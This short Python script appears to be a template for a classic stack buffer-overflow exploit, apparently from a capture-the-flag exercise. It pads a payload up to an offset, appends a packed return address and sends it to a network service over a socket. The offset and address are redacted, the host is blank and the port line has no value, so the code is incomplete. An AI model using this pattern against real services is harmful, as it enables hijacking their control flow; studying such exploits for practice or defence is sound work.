import socket
import struct

offset = _REDACTED_
address = _REDACTED_
payload = b"A" \* offset + struct.pack("<I", address)
host = ""
port =
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

# Receive initial data from the binary (optional)

print(conn.recv(1024).decode())
conn.sendall(payload + b"\n")
print(conn.recv(1024).decode())
conn.close()
